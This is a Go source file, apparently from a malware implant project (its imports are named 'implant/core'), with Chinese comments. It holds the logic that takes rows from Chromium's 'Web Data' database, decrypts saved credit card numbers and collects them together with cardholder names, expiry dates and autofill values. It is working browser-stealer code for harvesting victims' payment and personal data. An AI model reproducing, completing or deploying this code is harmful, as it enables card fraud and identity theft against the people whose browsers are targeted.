package services

// 本文件刻意**不带** build tag：这些"行 → 结构"的转换不依赖任何 Windows API，
// 放在跨平台文件里才能在 Linux 上跑单测（CI 就是 Linux）。

import (
	"strings"

	"implant/core/debuglog"
	"implant/core/sqlite"
)

// Web Data 的"行 → 结构"纯逻辑（不碰文件），单独抽出便于单测：
// 测试里用 Go 现造 v10 密文行，不必依赖 SQLite 写库能力。

// cardsFromRows credit_cards 表行 → 信用卡条目（卡号逐条解密，失败只跳过该条）
func cardsFromRows(rows []sqlite.Row, key []byte, browser, profile string) []CollectedCard {
	out := make([]CollectedCard, 0, len(rows))
	for _, r := range rows {
		blob := bytesValue(r["card_number_encrypted"])
		if len(blob) == 0 {
			continue
		}
		plain, derr := decryptChromiumBlob(key, blob)
		if derr != nil {
			debuglog.Printf("⚠️ [BROWSER] %s/%s 卡号解密失败: %v\n", browser, profile, derr)
			continue
		}
		number := strings.TrimSpace(string(plain))
		if number == "" {
			continue
		}
		out = append(out, CollectedCard{
			Name:     stringValue(r["name_on_card"]),
			Number:   number,
			ExpMonth: int(intValue(r["expiration_month"])),
			ExpYear:  int(intValue(r["expiration_year"])),
			Nickname: stringValue(r["nickname"]),
		})
		if len(out) >= maxCardItems {
			break
		}
	}
	return out
}

// autofillFromRows autofill 表行 → 自动填充条目（明文，无需解密）
func autofillFromRows(rows []sqlite.Row) []CollectedAutofill {
	out := make([]CollectedAutofill, 0, len(rows))
	for _, r := range rows {
		field := stringValue(r["name"])
		val := stringValue(r["value"])
		if field == "" || val == "" {
			continue
		}
		out = append(out, CollectedAutofill{
			Field: field, Value: val, Count: int(intValue(r["count"])),
		})
		if len(out) >= maxAutofillItems {
			break
		}
	}
	return out
}
func stringValue(v interface{}) string {
	switch x := v.(type) {
	case string:
		return x
	case []byte:
		return string(x)
	default:
		return ""
	}
}

func bytesValue(v interface{}) []byte {
	switch x := v.(type) {
	case []byte:
		return x
	case string:
		return []byte(x)
	default:
		return nil
	}
}

func intValue(v interface{}) int64 {
	switch x := v.(type) {
	case int64:
		return x
	case float64:
		return int64(x)
	default:
		return 0
	}
}
